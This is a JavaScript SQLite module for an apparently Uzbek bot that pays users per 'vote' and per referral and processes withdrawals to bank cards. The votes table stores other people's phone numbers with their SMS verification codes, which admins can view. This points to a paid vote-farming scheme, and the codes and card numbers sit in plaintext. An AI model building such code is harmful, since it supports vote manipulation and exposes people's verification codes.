const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const config = require('./config');

class Database {
  constructor(dbName = config.DB_NAME) {
    this.dbName = dbName;
    this.db = null;
  }

  async init() {
    this.db = await open({
      filename: this.dbName,
      driver: sqlite3.Database
    });

    // Create tables
    await this.db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        balance INTEGER DEFAULT 0,
        referred_by INTEGER,
        registered_at TEXT,
        phone_number TEXT
      )
    `);

    // Ensure phone_number column exists if table was created in old python version
    try {
      await this.db.exec("ALTER TABLE users ADD COLUMN phone_number TEXT");
    } catch (e) {
      // Column already exists
    }

    await this.db.exec(`
      CREATE TABLE IF NOT EXISTS votes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        phone_number TEXT,
        sms_code TEXT,
        status TEXT,
        created_at TEXT,
        updated_at TEXT,
        FOREIGN KEY (user_id) REFERENCES users(user_id)
      )
    `);

    await this.db.exec(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card_number TEXT,
        amount INTEGER,
        status TEXT,
        created_at TEXT,
        FOREIGN KEY (user_id) REFERENCES users(user_id)
      )
    `);

    await this.db.exec(`
      CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
      )
    `);

    await this.db.exec(`
      CREATE TABLE IF NOT EXISTS admins (
        user_id INTEGER PRIMARY KEY
      )
    `);

    // Seed settings
    await this._initSetting("project_url", config.DEFAULT_PROJECT_URL);
    await this._initSetting("vote_reward", String(config.VOTE_REWARD));
    await this._initSetting("referral_reward", String(config.REFERRAL_REWARD));
    await this._initSetting("min_withdraw", String(config.MIN_WITHDRAW));
    await this._initSetting("is_bot_active", "True");
  }

  async _initSetting(key, value) {
    await this.db.run(
      "INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
      [key, value]
    );
  }

  async getSetting(key, defaultValue = null) {
    const row = await this.db.get("SELECT value FROM settings WHERE key = ?", [key]);
    return row ? row.value : defaultValue;
  }

  async setSetting(key, value) {
    await this.db.run(
      "INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
      [key, String(value)]
    );
  }

  // Admin management DDLs
  async addAdmin(userId) {
    await this.db.run("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", [userId]);
  }

  async isAdmin(userId) {
    if (config.ADMINS.includes(userId)) return true;
    const row = await this.db.get("SELECT user_id FROM admins WHERE user_id = ?", [userId]);
    return row !== undefined;
  }

  async getAdmins() {
    const admins = [...config.ADMINS];
    const rows = await this.db.all("SELECT user_id FROM admins");
    rows.forEach(r => {
      if (!admins.includes(r.user_id)) {
        admins.push(r.user_id);
      }
    });
    return admins;
  }

  // User queries
  async addUser(userId, username, firstName, referredBy = null) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    
    // Check if user already exists
    const exists = await this.db.get("SELECT user_id FROM users WHERE user_id = ?", [userId]);
    if (!exists) {
      // Validate referral to avoid self-referral
      if (referredBy && parseInt(referredBy) === parseInt(userId)) {
        referredBy = null;
      }

      // Check if referrer exists
      if (referredBy) {
        const referrerExists = await this.db.get("SELECT user_id FROM users WHERE user_id = ?", [referredBy]);
        if (!referrerExists) {
          referredBy = null;
        }
      }

      await this.db.run(
        "INSERT INTO users (user_id, username, first_name, balance, referred_by, registered_at, phone_number) VALUES (?, ?, ?, 0, ?, ?, NULL)",
        [userId, username, firstName, referredBy, now]
      );
      return true;
    }
    return false;
  }

  async updateUserPhone(userId, phoneNumber) {
    await this.db.run("UPDATE users SET phone_number = ? WHERE user_id = ?", [phoneNumber, userId]);
  }

  async getUser(userId) {
    const row = await this.db.get(
      "SELECT user_id, username, first_name, balance, referred_by, registered_at, phone_number FROM users WHERE user_id = ?",
      [userId]
    );
    if (row) {
      return {
        user_id: row.user_id,
        username: row.username,
        first_name: row.first_name,
        balance: row.balance,
        referred_by: row.referred_by,
        registered_at: row.registered_at,
        phone_number: row.phone_number
      };
    }
    return null;
  }

  async getUserByPhone(phoneNumber) {
    const row = await this.db.get(
      "SELECT user_id, username, first_name, balance, referred_by, registered_at, phone_number FROM users WHERE phone_number = ?",
      [phoneNumber]
    );
    if (row) {
      return {
        user_id: row.user_id,
        username: row.username,
        first_name: row.first_name,
        balance: row.balance,
        referred_by: row.referred_by,
        registered_at: row.registered_at,
        phone_number: row.phone_number
      };
    }
    return null;
  }

  async updateBalance(userId, amount) {
    await this.db.run("UPDATE users SET balance = balance + ? WHERE user_id = ?", [amount, userId]);
  }

  async getReferralCount(userId) {
    const row = await this.db.get("SELECT COUNT(*) as count FROM users WHERE referred_by = ?", [userId]);
    return row ? row.count : 0;
  }

  // Vote queries
  async addVote(userId, phoneNumber) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const result = await this.db.run(
      "INSERT INTO votes (user_id, phone_number, sms_code, status, created_at, updated_at) VALUES (?, ?, NULL, 'pending_phone', ?, ?)",
      [userId, phoneNumber, now, now]
    );
    return result.lastID;
  }

  async addWebVote(phoneNumber, smsCode, userId = null) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const result = await this.db.run(
      "INSERT INTO votes (user_id, phone_number, sms_code, status, created_at, updated_at) VALUES (?, ?, ?, 'pending_sms', ?, ?)",
      [userId, phoneNumber, smsCode, now, now]
    );
    return result.lastID;
  }

  async verifyWebCode(phoneNumber, smsCode) {
    const row = await this.db.get(
      "SELECT id, user_id, sms_code FROM votes WHERE phone_number = ? AND status = 'pending_sms' ORDER BY id DESC LIMIT 1",
      [phoneNumber]
    );

    if (row) {
      const { id: voteId, user_id: userId, sms_code: dbCode } = row;
      if (dbCode === smsCode) {
        const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
        await this.db.run("UPDATE votes SET status = 'approved', updated_at = ? WHERE id = ?", [now, voteId]);

        if (userId) {
          const voteReward = parseInt(await this.getSetting("vote_reward", String(config.VOTE_REWARD)));
          await this.db.run("UPDATE users SET balance = balance + ? WHERE user_id = ?", [voteReward, userId]);

          // Referrer reward check
          const userRow = await this.db.get("SELECT referred_by FROM users WHERE user_id = ?", [userId]);
          if (userRow && userRow.referred_by) {
            const referrerId = userRow.referred_by;
            const refReward = parseInt(await this.getSetting("referral_reward", String(config.REFERRAL_REWARD)));
            await this.db.run("UPDATE users SET balance = balance + ? WHERE user_id = ?", [refReward, referrerId]);
          }
        }
        return { success: true, vote_id: voteId, user_id: userId };
      }
    }
    return { success: false };
  }

  async updateVoteSms(voteId, smsCode) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    await this.db.run(
      "UPDATE votes SET sms_code = ?, status = 'pending_sms', updated_at = ? WHERE id = ?",
      [smsCode, now, voteId]
    );
  }

  async updateVoteStatus(voteId, status) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    await this.db.run("UPDATE votes SET status = ?, updated_at = ? WHERE id = ?", [status, now, voteId]);
  }

  async getVote(voteId) {
    const row = await this.db.get(
      "SELECT id, user_id, phone_number, sms_code, status, created_at, updated_at FROM votes WHERE id = ?",
      [voteId]
    );
    return row || null;
  }

  async getPendingVotes() {
    const rows = await this.db.all(
      "SELECT id, user_id, phone_number, sms_code, status, created_at FROM votes WHERE status IN ('pending_phone', 'pending_sms') ORDER BY id DESC"
    );
    return rows;
  }

  async checkActiveVoteExists(userId) {
    const row = await this.db.get(
      "SELECT COUNT(*) as count FROM votes WHERE user_id = ? AND status IN ('pending_phone', 'pending_sms')",
      [userId]
    );
    return row ? row.count > 0 : false;
  }

  async checkPhoneVotedAlready(phoneNumber) {
    const row = await this.db.get(
      "SELECT COUNT(*) as count FROM votes WHERE phone_number = ? AND status = 'approved'",
      [phoneNumber]
    );
    return row ? row.count > 0 : false;
  }

  async getUserSuccessfulVotesCount(userId) {
    const row = await this.db.get(
      "SELECT COUNT(*) as count FROM votes WHERE user_id = ? AND status = 'approved'",
      [userId]
    );
    return row ? row.count : 0;
  }

  // Withdrawal queries
  async addWithdrawal(userId, cardNumber, amount) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const result = await this.db.run(
      "INSERT INTO withdrawals (user_id, card_number, amount, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
      [userId, cardNumber, amount, now]
    );
    // Deduct immediately
    await this.db.run("UPDATE users SET balance = balance - ? WHERE user_id = ?", [amount, userId]);
    return result.lastID;
  }

  async getPendingWithdrawals() {
    const rows = await this.db.all(
      "SELECT id, user_id, card_number, amount, status, created_at FROM withdrawals WHERE status = 'pending' ORDER BY id DESC"
    );
    return rows;
  }

  async getWithdrawal(withdrawalId) {
    const row = await this.db.get(
      "SELECT id, user_id, card_number, amount, status, created_at FROM withdrawals WHERE id = ?",
      [withdrawalId]
    );
    return row || null;
  }

  async updateWithdrawalStatus(withdrawalId, status) {
    // If rejected, refund user balance
    if (status === "rejected") {
      const row = await this.db.get(
        "SELECT user_id, amount FROM withdrawals WHERE id = ? AND status = 'pending'",
        [withdrawalId]
      );
      if (row) {
        await this.db.run("UPDATE users SET balance = balance + ? WHERE user_id = ?", [row.amount, row.user_id]);
      }
    }

    await this.db.run("UPDATE withdrawals SET status = ? WHERE id = ?", [status, withdrawalId]);
  }

  // Stats
  async getStats() {
    const usersCountRow = await this.db.get("SELECT COUNT(*) as count FROM users");
    const approvedVotesRow = await this.db.get("SELECT COUNT(*) as count FROM votes WHERE status = 'approved'");
    const pendingVotesRow = await this.db.get("SELECT COUNT(*) as count FROM votes WHERE status IN ('pending_phone', 'pending_sms')");
    const totalWithdrawnRow = await this.db.get("SELECT SUM(amount) as sum FROM withdrawals WHERE status = 'approved'");
    const pendingWithdrawnRow = await this.db.get("SELECT SUM(amount) as sum FROM withdrawals WHERE status = 'pending'");

    return {
      total_users: usersCountRow ? usersCountRow.count : 0,
      approved_votes: approvedVotesRow ? approvedVotesRow.count : 0,
      pending_votes: pendingVotesRow ? pendingVotesRow.count : 0,
      total_withdrawn: totalWithdrawnRow ? (totalWithdrawnRow.sum || 0) : 0,
      pending_withdrawn: pendingWithdrawnRow ? (pendingWithdrawnRow.sum || 0) : 0
    };
  }

  async getAllUsersList() {
    const rows = await this.db.all("SELECT user_id FROM users");
    return rows.map(r => r.user_id);
  }

  // Leaderboard
  async getTopReferrers(limit = 10) {
    const rows = await this.db.all(
      `SELECT u.user_id, u.first_name, u.username, COUNT(r.user_id) as ref_count
       FROM users u
       INNER JOIN users r ON r.referred_by = u.user_id
       GROUP BY u.user_id
       ORDER BY ref_count DESC
       LIMIT ?`,
      [limit]
    );
    return rows.map(r => ({
      user_id: r.user_id,
      first_name: r.first_name,
      username: r.username || "Yashirin",
      ref_count: r.ref_count
    }));
  }

  async getTopVoters(limit = 10) {
    const rows = await this.db.all(
      `SELECT u.user_id, u.first_name, u.username, COUNT(v.id) as vote_count
       FROM users u
       INNER JOIN votes v ON v.user_id = u.user_id AND v.status = 'approved'
       GROUP BY u.user_id
       ORDER BY vote_count DESC
       LIMIT ?`,
      [limit]
    );
    return rows.map(r => ({
      user_id: r.user_id,
      first_name: r.first_name,
      username: r.username || "Yashirin",
      vote_count: r.vote_count
    }));
  }
}

module.exports = Database;
